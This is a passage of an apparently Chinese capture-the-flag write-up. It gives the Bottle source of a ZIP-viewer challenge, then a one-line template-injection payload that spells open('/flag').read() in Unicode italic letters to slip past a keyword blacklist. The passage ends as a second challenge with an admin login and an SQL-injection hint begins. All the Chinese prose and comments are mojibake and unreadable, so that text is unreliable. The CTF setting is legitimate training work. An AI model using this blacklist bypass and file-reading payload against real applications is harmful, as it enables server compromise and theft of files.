class="string">&quot;&quot;&quot;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„å…³é”®è¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å®‰å…¨è§£å‹ZIPæ–‡ä»¶ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³•æ–‡ä»¶è·¯å¾„: è·¯å¾„éå†æ”»å‡»æ£€æµ‹&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é¦–é¡µ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“¤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;è½»æ¾æŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;ä¸Šä¼ ZIPæ–‡ä»¶å¹¶å®‰å…¨åœ°æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œæ— éœ€è§£å‹åˆ°æœ¬åœ°è®¾å¤‡&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“ ä¸Šä¼ ZIPæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                â„¹ï¸ äº†è§£æ›´å¤š</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ›¡ï¸&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å®‰å…¨æ£€æµ‹&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æµ‹ä¸Šä¼ æ–‡ä»¶ï¼Œé˜²æ­¢è·¯å¾„éå†æ”»å‡»å’Œæ¶æ„å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“„&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å†…å®¹é¢„è§ˆ&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç›´æ¥åœ¨çº¿æŸ¥çœ‹ZIPæ–‡ä»¶ä¸­çš„æ–‡æœ¬å†…å®¹ï¼Œæ— éœ€ä¸‹è½½&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;âš¡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å¿«é€Ÿå¤„ç†&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;é«˜æ•ˆå¤„ç†å°äº1MBçš„ZIPæ–‡ä»¶ï¼Œå¿«é€Ÿè·å–å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸Šä¼ é¡µé¢&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ ZIPæ–‡ä»¶&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;ğŸ“¤ ä¸Šä¼ ZIPæ–‡ä»¶&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;é€‰æ‹©ZIPæ–‡ä»¶ï¼ˆæœ€å¤§1MBï¼‰&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;ä»…æ”¯æŒ.zipæ ¼å¼çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å¤§å°ä¸è¶…è¿‡1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“¤ ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        â†©ï¸ è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¤„ç†æ–‡ä»¶ä¸Šä¼ &quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;è¯·ä¸Šä¼ æœ‰æ•ˆçš„ZIPæ–‡ä»¶&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;æ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;å¤„ç†ZIPæ–‡ä»¶æ—¶å‡ºé”™: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ æˆåŠŸ&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;âœ… ä¸Šä¼ æˆåŠŸ!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            âœ… æ–‡ä»¶å·²æˆåŠŸä¸Šä¼ å¹¶è§£å‹</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;ğŸ“„ &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    æŸ¥çœ‹</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ‘€ æŸ¥çœ‹ç¬¬ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        â• ä¸Šä¼ å¦ä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ğŸ  è¿”å›é¦–é¡µ</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶ä¸å­˜åœ¨&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯·æ±‚çš„è·¯å¾„ä¸æ˜¯æ–‡ä»¶&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;éæ³•è®¿é—®å°è¯•&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ— æ³•è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¯èƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ–‡ä»¶å†…å®¹åŒ…å«ä¸å…è®¸çš„å…³é”®è¯&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;æ¸²æŸ“é”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é™æ€æ–‡ä»¶æœåŠ¡&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;è®¨åŒå•¦ä¸æ˜¯è¯´å¥½åªçœ‹çœ‹ä¸æ‘¸çš„å—&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ä¸è¦é€è¿›æ¥å•Šå•Šå•Šå•Š&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åŸç¥ï¼Œå¯åŠ¨!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>bottleæ¡†æ¶ä¸‹çš„sstiæ–œä½“å­—ç›´æ¥ç»•è¿‡</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;â„´ğ“…â„¯ğ“ƒ(&#x27;/flag&#x27;).ğ“‡â„¯ağ’¹()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="flagåˆ°åº•åœ¨å“ª"><a href="#flagåˆ°åº•åœ¨å“ª" class="headerlink" title="flagåˆ°åº•åœ¨å“ª"></a>flagåˆ°åº•åœ¨å“ª</h2><p>&#x2F;robots.txtå¾—åˆ°&#x2F;admin&#x2F;login.phpï¼Œç„¶åæ˜¯ä¸€ä¸ªç™»å½•æ¡†</p><p><img src="/../images/achieve/2025/11/image-20251202214820781.png" alt="image-20251202214820781"></p><p>è¿™é‡Œæœ‰ä¸ªhintï¼Œè¿˜ä»¥ä¸ºæ˜¯å¼±å£ä»¤ï¼Œæ²¡è·‘å‡ºæ¥ï¼sqlæ³¨å…¥ä¹Ÿæµ‹ä¸å‡ºæ¥ï¼åé¢æ”¾äº†ä¸ªhint</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°è“é²¨è¯´è´¦æˆ·å¿…é¡»æ˜¯adminå“¦ï¼Œä¸è¦åœ¨ç”¨æˆ·åä¸Šåšå°è¯•å•¦! å¦‚æœè¦ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦è¯·ä½¿ç”¨å¤§å†™</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 